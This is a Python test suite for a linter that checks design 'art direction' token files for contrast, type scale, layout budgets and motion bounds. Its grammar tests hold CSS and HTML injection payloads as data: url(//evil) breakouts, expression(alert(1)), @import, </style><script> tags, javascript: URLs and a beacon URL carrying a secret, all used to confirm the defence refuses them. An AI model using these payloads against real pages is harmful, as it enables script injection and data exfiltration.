"""The linter, including the deliberately broken art direction.

Two halves, and the phase is explicit that they are one feature: the design
rules refuse an art direction nobody could read, and the grammar rules refuse
one that is an injection. Both are hard failures and both are tested here,
because a security check kept in a separate file is a security check that gets
its own schedule.

**The broken art direction is built by mutating a real one**, field by field,
rather than by hand-writing a whole invalid record. A hand-written one drifts
from the real shape the moment a field is added, and then it stops exercising
the rules it was written for while still passing.
"""

import pytest
from pydantic import ValidationError

from features.art_direction.dtcg import from_document, srgb, to_document
from features.art_direction.lint import (
    lint_art_direction,
    lint_art_direction_with_brand,
    lint_motion_vocabulary,
)
from features.art_direction.lint_contrast import (
    Rgb,
    apca_lc,
    contrast_ratio,
    to_oklch,
    to_rgb,
)
from features.art_direction.seed import CINEMATIC_DARK, SYSTEM_ART_DIRECTIONS
from features.motion.seed import SYSTEM_MOTION_VOCABULARIES
from lib.result import Err
from schema.art_direction import (
    EXTENSION_KEY,
    ArtDirectionRecord,
    LintFinding,
    LintReport,
)


def _rules(report: LintReport) -> set[str]:
    return {finding.rule for finding in report.findings}


def _mutated(**changes: object) -> ArtDirectionRecord:
    """A real record with specific fields replaced, through a round trip.

    Through the wire form rather than by copying the model, so every mutation
    below is one a *file* could contain — which is what the import path
    actually receives.
    """
    payload = CINEMATIC_DARK.model_dump(mode="json", by_alias=True)
    for path, value in changes.items():
        node: dict[str, object] = payload
        keys = path.split(".")
        for key in keys[:-1]:
            child = node[key]
            assert isinstance(child, dict)
            node = child
        node[keys[-1]] = value
    return ArtDirectionRecord.model_validate(payload)


# ---------------------------------------------------------------------------
# The shipped art directions
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("record", SYSTEM_ART_DIRECTIONS, ids=lambda r: str(r.id))
def test_every_shipped_art_direction_passes_every_rule(
    record: ArtDirectionRecord,
) -> None:
    """The exit-gate assertion, and the one that made this phase change a design.

    `cinematic-dark` failed APCA on three pairs when the linter first ran —
    muted body text at Lc 48, the eyebrow at Lc 33.9, and the CTA label on its
    accent fill at Lc 70.6 — while clearing WCAG 2.2 AA on all three at 7.14:1,
    4.94:1 and 11.09:1. That is exactly the failure mode the two-standard rule
    exists for, and the response was to fix the art direction. Relaxing the gate
    to accommodate the flagship is how a gate becomes decorative.
    """
    report = lint_art_direction(record)
    assert report.ok, [f"{f.rule} at {f.path}" for f in report.findings]


@pytest.mark.parametrize("record", SYSTEM_MOTION_VOCABULARIES, ids=lambda r: str(r.id))
def test_every_shipped_vocabulary_passes(record: object) -> None:
    from schema.motion import MotionVocabularyRecord

    assert isinstance(record, MotionVocabularyRecord)
    report = lint_motion_vocabulary(record)
    assert report.ok, [f"{f.rule} at {f.path}" for f in report.findings]


# ---------------------------------------------------------------------------
# Design rules
# ---------------------------------------------------------------------------


def test_the_deliberately_broken_art_direction_fails_every_rule_it_violates() -> None:
    """One record that breaks everything at once, and every rule has to fire.

    Separately-broken records would each pass the rules they do not violate,
    which tests the rules but not the *report* — and the report is the feature.
    A linter that stops at the first finding makes fixing an art direction a
    sequence of eleven saves.
    """
    broken = _mutated(
        **{
            # 2:1 contrast: an ink barely lighter than its ground.
            "tokens.color.ink": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.25, 0.25, 0.26],
                    "alpha": 1.0,
                },
            },
            # Non-monotonic: a section larger than the hero it sits under.
            "extensions.fluid.type": {
                **CINEMATIC_DARK.extensions.fluid.type.model_dump(
                    mode="json", by_alias=True
                ),
                # A hero no larger than its body text, under a section twice
                # its size: non-monotonic *and* out of range at once.
                "hero": {
                    "font": "display",
                    "size": {
                        "min": {"value": 2.0, "unit": "rem"},
                        "preferred": {"value": 2.0, "unit": "rem"},
                        "max": {"value": 2.0, "unit": "rem"},
                    },
                },
                "section": {
                    "font": "display",
                    "size": {
                        "min": {"value": 20.0, "unit": "rem"},
                        "preferred": {"value": 20.0, "unit": "rem"},
                        "max": {"value": 20.0, "unit": "rem"},
                    },
                },
            },
            # A measure nobody can read across, in the wrong unit's range.
            "extensions.fluid.rhythm": {
                **CINEMATIC_DARK.extensions.fluid.rhythm.model_dump(
                    mode="json", by_alias=True
                ),
                "measure": {"value": 120.0, "unit": "ch"},
            },
            # A headline budget that cannot hold a headline.
            "extensions.budgets": {
                **CINEMATIC_DARK.extensions.budgets.model_dump(
                    mode="json", by_alias=True
                ),
                "headline": 6,
            },
        }
    )

    report = lint_art_direction(broken)
    found = _rules(report)

    assert "CONTRAST_BELOW_WCAG_AA" in found
    assert "CONTRAST_BELOW_APCA" in found
    assert "TYPE_SCALE_NOT_MONOTONIC" in found
    assert "TYPE_SCALE_RANGE" in found
    assert "MEASURE_OUT_OF_RANGE" in found
    assert "HEADLINE_BUDGET_OUT_OF_RANGE" in found


def test_an_ad_that_passes_wcag_and_fails_apca_is_rejected() -> None:
    """**The single most important test in this file.**

    If this passes, the APCA gate is not wired — and that exact combination,
    clearing 4.5:1 while scoring in the fifties, is what every muddy dark theme
    on the internet looks like. It is not a hypothetical: it is what
    `cinematic-dark` was before this phase.
    """
    muddy = _mutated(
        **{
            "tokens.color.ink": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.6, 0.6, 0.604],
                    "alpha": 1.0,
                },
            }
        }
    )

    ink = Rgb(0.6 * 255, 0.6 * 255, 0.604 * 255)
    # Both grounds, because the linter checks both and a fixture that cleared
    # the floor on one of them would fail this test for the wrong reason.
    for ground in (Rgb(8, 9, 11), Rgb(16, 18, 21)):
        assert contrast_ratio(ink, ground) >= 4.5, "must clear the legal floor"
        assert abs(apca_lc(ink, ground)) < 75, "must fail the perceptual gate"

    report = lint_art_direction(muddy)
    assert "CONTRAST_BELOW_APCA" in _rules(report)
    assert "CONTRAST_BELOW_WCAG_AA" not in _rules(report)


def test_contrast_is_checked_against_the_elevated_ground_too() -> None:
    """A framed panel is a real surface real text sits on.

    An art direction whose muted text passes on the page and fails on a panel
    has a bug that appears in one layout, which is the kind nobody finds by
    looking at a homepage.
    """
    broken = _mutated(
        **{
            "tokens.color.bgElevated": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.85, 0.85, 0.86],
                    "alpha": 1.0,
                },
            }
        }
    )
    report = lint_art_direction(broken)
    assert any("bgElevated" in f.message for f in report.findings)


def test_the_cta_fill_is_judged_even_though_no_type_role_names_it() -> None:
    """The CTA sets `bg` on an `accent` fill — the most important text on the
    page, and a pair the type scale does not describe because the colours are
    the other way round. Walking the type scale alone would miss it, which is
    how it stayed at Lc 70.6 through two phases."""
    dull = _mutated(
        **{
            "tokens.color.accent": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.35, 0.3, 0.15],
                    "alpha": 1.0,
                },
            }
        }
    )
    report = lint_art_direction(dull)
    assert any(f.path == "tokens.color.accent" for f in report.findings)


def test_a_saturated_light_colour_on_a_dark_ground_is_rejected() -> None:
    """Rule 19, arriving through the palette rather than through a filter.

    A colour this loud and this light on a near-black ground blooms, which is
    the effect the no-gradient rules forbid by every other route.
    """
    neon = _mutated(
        **{
            "tokens.color.accent": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.35, 1.0, 0.4],
                    "alpha": 1.0,
                },
            }
        }
    )
    color = to_oklch(Rgb(0.35 * 255, 255, 0.4 * 255))
    assert color.chroma > 0.20 and color.lightness > 0.72, "fixture must be loud+light"
    assert "SATURATION_BLOOMS_ON_DARK_GROUND" in _rules(lint_art_direction(neon))


# ---------------------------------------------------------------------------
# The rule art direction #3 rewrote, and the one it added
# ---------------------------------------------------------------------------


def test_a_large_type_scale_is_allowed_when_the_budget_pays_for_it() -> None:
    """The bound `bold-brutalist` found, from the other side.

    The ceiling on `hero / normal` was a flat 8.0, chosen when there were two
    art directions — and it rejected this one at 13.18x. That was the rule
    mistaking a value it had only ever seen under two designs for a universal
    one, which is the failure docs/v2/plan/README.md predicts by name.

    What the ceiling was protecting against is in its own message: a headline
    that orphans the body text under it. That is not a property of the ratio, it
    is a property of how much text is set at that size. So the bound moved onto
    the product of the two, and this is the assertion that a large ratio is fine
    *when it is paid for*.
    """
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    ratio = (
        brutalist.extensions.fluid.type.hero.size.max.value
        / brutalist.extensions.fluid.type.normal.size.max.value
    )
    assert ratio > 8.0, "the fixture must exceed the ceiling this rule replaced"
    assert lint_art_direction(brutalist).ok


def test_the_same_type_scale_is_refused_when_the_budget_does_not() -> None:
    """And the half that makes the rule a gate rather than a licence.

    Same art direction, same enormous type, a headline budget that does not pay
    for it. **This case is stricter than the flat ceiling was**, not looser:
    8x body against the 80-character budget docs/v2/art-direction-system.md
    sketches for `editorial-light` is 640 body-ems and is now refused, where the
    old rule waved it through. The bound was not relaxed to admit a fashionable
    art direction.
    """
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    loosened = brutalist.model_copy(deep=True)
    loosened.extensions.budgets.headline = 80
    assert "HEADLINE_SET_WIDTH" in _rules(lint_art_direction(loosened))


def test_a_tiny_budget_does_not_buy_an_unbounded_type_scale() -> None:
    """The backstop the product bound needs. Without an absolute ceiling, a
    20-character budget would licence a hero at 26x body — a rule that can be
    satisfied by making the headline shorter forever is not a rule."""
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    absurd = brutalist.model_copy(deep=True)
    absurd.extensions.budgets.headline = 20
    absurd.extensions.fluid.type.hero.size.max.value = 30.0
    assert "TYPE_SCALE_RANGE" in _rules(lint_art_direction(absurd))


def test_a_brand_ground_that_is_not_allowed_is_a_contradiction() -> None:
    """Two individually-valid fields that cannot both be right.

    Refused rather than resolved toward either half: picking one would mean
    guessing whether a customer's colour is supposed to become their whole page.
    """
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    contradictory = brutalist.model_copy(deep=True)
    contradictory.extensions.brand_mapping.allow_brand_background = False
    assert "BRAND_BACKGROUND_NOT_ALLOWED" in _rules(lint_art_direction(contradictory))


# ---------------------------------------------------------------------------
# An art direction plus a brand is a second thing that must also be lintable
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "primary",
    ["#808080", "#12234a", "#b8402a", "#6e0a00"],
    ids=["mid-grey", "corporate-navy", "oxide-red", "its-own-accent"],
)
def test_a_brand_ground_too_dark_for_the_art_directions_type_is_refused(
    primary: str,
) -> None:
    """The exit-gate case, and the answer is a refusal rather than a rescue.

    `bold-brutalist` sets near-black type directly on the brand colour at full
    strength — uncorrected, because a corrected brand ground is a brand colour
    the art direction decided it knew better than, which is the opposite of what
    it offers. So a dark brand is refused, and the refusal is the deliverable.

    The `its-own-accent` case is the sharp one: the art direction's own oxide
    red is a colour it is happy to *print with* and cannot be *printed on*.
    """
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    report = lint_art_direction_with_brand(brutalist, primary)
    assert not report.ok
    assert _rules(report) <= {"CONTRAST_BELOW_WCAG_AA", "CONTRAST_BELOW_APCA"}


@pytest.mark.parametrize(
    "primary", ["#ffd6e8", "#39ff14", "#f2e535"], ids=["pastel", "neon", "signal"]
)
def test_a_light_brand_ground_is_accepted_at_full_strength(primary: str) -> None:
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    assert lint_art_direction_with_brand(brutalist, primary).ok


def test_the_cta_pair_is_judged_against_the_brand_ground_independently() -> None:
    """The pair that is easy to forget: a CTA label is `bg`-coloured text, so
    when `bg` becomes the brand, the most important text on the page changes
    colour and lands on a fill nobody re-measured it against.

    **It takes a mutated accent to demonstrate, and that is worth recording
    rather than working around.** With `bold-brutalist` as shipped the check is
    unreachable on its own: its accent is a deep oxide red at OKLCH L 0.34, and
    any brand light enough to pass the *ground* check contrasts with it easily.
    The ground check strictly dominates, so every brand this art direction
    refuses, it refuses for the other reason.

    A first attempt at this test used a real brand colour and asserted only that
    the words "button fill" appeared in some finding — which passed while both
    checks were failing together and would have gone on passing if the CTA check
    were deleted. Lightening the accent is what makes the assertion mean what it
    says, and it is a legitimate art direction: a pale fill with the page colour
    as its label is a real design, and it is the one this rule exists for.
    """
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    pale = brutalist.model_copy(deep=True)
    pale.tokens.color.accent = srgb("#e8dc90")

    report = lint_art_direction_with_brand(pale, "#f2e535")
    assert not report.ok
    assert {f.path for f in report.findings} == {"brand.primary"}
    # Every finding is the fill, and none is the ground — which is the claim.
    assert all("button fill" in f.message for f in report.findings)


def test_an_art_direction_that_does_not_take_a_brand_ground_has_nothing_to_check() -> (
    None
):
    """Not a silent pass: for `accent`-role directions the check *is* the
    correction loop in `resolve-brand.ts`, which runs where the measurement has
    to be synchronous and local. This asserts the split rather than hiding it."""
    for record in SYSTEM_ART_DIRECTIONS:
        if record.extensions.brand_mapping.accent_role == "bg":
            continue
        assert lint_art_direction_with_brand(record, "#39ff14").ok


@pytest.mark.parametrize(
    "primary", ["rgb(1,2,3)", "#fff", "", "#f2e53z", "red; }"], ids=lambda v: repr(v)
)
def test_a_brand_primary_that_is_not_a_hex_colour_is_refused(primary: str) -> None:
    """Parsed and re-serialized, never passed through — this value becomes a CSS
    custom property on a published page (rule 13)."""
    brutalist = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == "bold-brutalist")
    report = lint_art_direction_with_brand(brutalist, primary)
    assert _rules(report) == {"BRAND_PRIMARY_NOT_A_COLOUR"}


def test_motion_durations_outside_the_band_are_rejected() -> None:
    vocabulary = SYSTEM_MOTION_VOCABULARIES[0].model_copy(deep=True)
    vocabulary.durations.reveal = 4000
    assert "MOTION_DURATION_OUT_OF_RANGE" in _rules(lint_motion_vocabulary(vocabulary))


def test_a_reduced_mode_slower_than_the_floor_is_rejected() -> None:
    """The format has no way to declare a reduced mode that *moves* — that is
    structural — so the one number it does carry is the one worth bounding."""
    vocabulary = SYSTEM_MOTION_VOCABULARIES[0].model_copy(deep=True)
    with pytest.raises(ValidationError):
        # The schema refuses it first, which is the stronger control and the
        # reason this assertion is a `raises` rather than a finding.
        vocabulary.__class__.model_validate(
            {
                **vocabulary.model_dump(mode="json", by_alias=True),
                "reducedMotion": {"duration": 900},
            }
        )


# ---------------------------------------------------------------------------
# Grammar — the injection boundary
#
# Every one of these asserts *which layer* refused the value, because a control
# that passes because a different control caught it is a control nobody has
# tested. For most of them the answer is the schema, and that is the finding
# worth recording: the types are the defence and the linter is the assertion
# that they still are.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "red; } body { background: url(//evil)",
        "expression(alert(1))",
        "@import 'http://evil'",
        "</style><script>alert(1)</script>",
        "javascript:alert(1)",
        "\\75 rl(//evil)",
    ],
)
def test_a_hostile_colour_value_has_no_representation(payload: str) -> None:
    """A colour is three floats and an alpha. There is no field a string can
    arrive in, so the parse refuses it before the linter is reached — which is
    the strongest possible version of this control and the reason the schema
    carries it rather than a regex."""
    with pytest.raises(ValidationError):
        _mutated(
            **{
                "tokens.color.accent": {
                    "$type": "color",
                    "$value": {"colorSpace": "srgb", "components": payload},
                }
            }
        )


def test_a_free_text_font_family_has_no_representation() -> None:
    """The most natural-looking free-text token in the system, and the one that
    most easily carries a payload. It is a `Literal` of vetted names, so a
    family from outside the registry fails the parse."""
    with pytest.raises(ValidationError):
        _mutated(
            **{
                "tokens.font": {
                    "display": {"$type": "fontFamily", "$value": "Evil'; }"},
                    "text": {"$type": "fontFamily", "$value": "Inter"},
                }
            }
        )


@pytest.mark.parametrize(
    "payload",
    [
        "url(//evil)",
        "expression(1)",
        "@import x",
        "</style",
        "javascript:x",
        "a\\b",
        "a; b",
        "a { b",
    ],
)
def test_the_linter_refuses_a_hostile_string_that_survives_the_parse(
    payload: str,
) -> None:
    """`name` is the field with room for one.

    It is not emitted into CSS today — it labels an art direction in a picker,
    where React escapes it — which is exactly why it is the right test subject:
    the grammar walk does not know or care which strings are emitted, so a field
    that *becomes* emitted later is already covered.
    """
    report = lint_art_direction(_mutated(name=f"Cinematic {payload}"))
    assert "GRAMMAR_FORBIDDEN_SEQUENCE" in _rules(report)


def test_a_control_character_is_refused() -> None:
    report = lint_art_direction(_mutated(name="Cinematic\x00Dark"))
    assert "GRAMMAR_CONTROL_CHARACTER" in _rules(report)


def test_a_hex_fallback_that_disagrees_with_its_components_is_refused() -> None:
    """The one thing a type cannot catch: two fields that must agree.

    Nothing reads the fallback, so a mismatch renders correctly today — and
    that is what makes it worth refusing, because it is a string in the record
    that no longer means what the record means, and the next person to "fix"
    the renderer to read it ships whatever it says.
    """
    lying = _mutated(
        **{
            "tokens.color.bg": {
                "$type": "color",
                "$value": {
                    "colorSpace": "srgb",
                    "components": [0.03, 0.035, 0.043],
                    "alpha": 1.0,
                    "hex": "#ffffff",
                },
            }
        }
    )
    assert "GRAMMAR_HEX_DISAGREES_WITH_COMPONENTS" in _rules(lint_art_direction(lying))


def test_no_token_can_name_a_gradient_or_a_blur() -> None:
    """Rules 18 and 19. There is no token whose *type* could produce either, so
    this is an assertion about the schema as much as about a value — and it is
    what says no the day someone adds a `filter` token for one direction."""
    assert "NO_RAMP" in _rules(
        lint_art_direction(_mutated(name="Linear Gradient Dark"))
    )
    assert "NO_BLOOM" in _rules(lint_art_direction(_mutated(name="Soft Shadow Dark")))


# ---------------------------------------------------------------------------
# Fails closed
# ---------------------------------------------------------------------------


def test_the_linter_refuses_the_save_when_it_raises(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Rule 10: anything that grants fails closed, and a linter is a thing that
    grants. A crash that produced an empty report would be a save allowed
    *because* the check broke — which is the most dangerous shape a bug in this
    file could take, since everything downstream would look green."""

    def explode(_: ArtDirectionRecord) -> list[LintFinding]:
        raise RuntimeError("boom")

    monkeypatch.setattr("features.art_direction.lint.check_grammar", explode)

    report = lint_art_direction(CINEMATIC_DARK)
    assert not report.ok
    assert _rules(report) == {"LINTER_ERROR"}


def test_a_finding_never_carries_the_offending_value() -> None:
    """A token set is a customer's design and a finding reaches a log.

    The path says which field; the message says what is wrong and why. Neither
    quotes the value, with one deliberate exception — an unvetted font family,
    where the name *is* the finding and is already a public font name.
    """
    hostile_name = "Cinematic url(//tracker.example/beacon?id=SECRET)"
    report = lint_art_direction(_mutated(name=hostile_name))
    assert report.findings
    for finding in report.findings:
        assert "SECRET" not in finding.message
        assert "tracker.example" not in finding.message


def test_a_finding_is_written_for_a_person() -> None:
    """The message is part of the feature. A linter that says
    `SCALE_RANGE_VIOLATION` teaches nobody anything."""
    broken = _mutated(
        **{
            "extensions.budgets": {
                **CINEMATIC_DARK.extensions.budgets.model_dump(
                    mode="json", by_alias=True
                ),
                "headline": 6,
            }
        }
    )
    finding = next(
        f
        for f in lint_art_direction(broken).findings
        if f.rule == "HEADLINE_BUDGET_OUT_OF_RANGE"
    )
    # Says the number, the bound, and what goes wrong — not just the rule name.
    assert "6" in finding.message
    assert "fragments" in finding.message or "paragraph" in finding.message
    assert len(finding.message.split()) > 12


def test_findings_are_typed_and_carry_a_greppable_rule_code() -> None:
    report = lint_art_direction(_mutated(name="Bad } Dark"))
    assert all(isinstance(f, LintFinding) for f in report.findings)
    assert all(f.rule.isupper() for f in report.findings)


# ---------------------------------------------------------------------------
# The cross-language pin
# ---------------------------------------------------------------------------

# WCAG 2.2 contrast against each art direction's own `bg`, to four decimals.
#
# **Shared with `web/src/features/art-direction/art-direction.test.ts`. Do not
# edit one copy.** `contrast_ratio` here and `contrastRatio` in `color.ts` are
# two implementations of one formula, which is a duplication — the honest way to
# carry one is to make drift fail rather than to hope, so both sides assert this
# table against the same seeded records. It is the same treatment `seed_from_id`
# gets, for the same reason.
#
# Only WCAG appears here. APCA has no TypeScript implementation to disagree
# with: the linter runs in `api` at the point of save, and `web` has never
# needed the perceptual gate.
_CONTRAST_FIXTURES = [
    # (art direction, palette role, WCAG 2.2 ratio, APCA Lc against its own bg)
    #
    # **The Lc column carries its sign**, and that is the column that proves the
    # boundary is crossed by the thing we care about. WCAG's ratio is
    # polarity-blind: `cinematic-dark` and `editorial-light` both score ~18:1
    # for full ink and the number cannot tell you one is white-on-black. The Lc
    # values are -100.6 and +103.5. A TypeScript port that dropped the sign, or
    # swapped the two branches of the transfer function, would still pass a
    # ratio-only table and would be wrong about every dark art direction.
    ("cinematic-dark", "ink", 18.1226, -100.5802),
    ("cinematic-dark", "ink_muted", 13.0187, -78.4442),
    ("cinematic-dark", "ink_faint", 4.9409, -33.9427),
    ("cinematic-dark", "accent", 13.0978, -78.9501),
    ("editorial-light", "ink", 18.3965, 103.4859),
    ("editorial-light", "ink_muted", 6.9943, 83.0809),
    ("editorial-light", "ink_faint", 4.1428, 67.5481),
    ("editorial-light", "accent", 7.7501, 84.3561),
    ("bold-brutalist", "ink", 15.0287, 88.2312),
    ("bold-brutalist", "ink_muted", 11.7961, 84.7988),
    ("bold-brutalist", "ink_faint", 5.1078, 65.3753),
    ("bold-brutalist", "accent", 9.3966, 78.7104),
]


@pytest.mark.parametrize(
    ("art_direction_id", "role", "expected_ratio", "expected_lc"),
    _CONTRAST_FIXTURES,
    ids=lambda v: str(v),
)
def test_contrast_matches_its_typescript_twin(
    art_direction_id: str, role: str, expected_ratio: float, expected_lc: float
) -> None:
    record = next(r for r in SYSTEM_ART_DIRECTIONS if r.id == art_direction_id)
    ground = to_rgb(record.tokens.color.bg.value)
    text = to_rgb(getattr(record.tokens.color, role).value)
    assert round(contrast_ratio(text, ground), 4) == expected_ratio
    assert round(apca_lc(text, ground), 4) == expected_lc


def test_a_hostile_token_file_is_refused_by_the_import_path() -> None:
    """The import boundary, end to end.

    A parse alone would accept this — the shape is right and every value is the
    right type. It is the *linter* that refuses it, which is the half that would
    have been skipped if the two were separate features, and the test says so
    explicitly rather than being satisfied by either.
    """
    document = to_document(CINEMATIC_DARK)
    extensions = document["$extensions"]
    assert isinstance(extensions, dict)
    payload = extensions[EXTENSION_KEY]
    assert isinstance(payload, dict)
    payload["name"] = "Cinematic url(//evil)"

    # The shape is still valid: prove it, so the failure below cannot be the
    # parse quietly doing the work.
    assert ArtDirectionRecord.model_validate(
        {**CINEMATIC_DARK.model_dump(mode="json", by_alias=True)}
    )

    result = from_document(document)
    assert isinstance(result, Err)
    assert "linter" in result.error.message
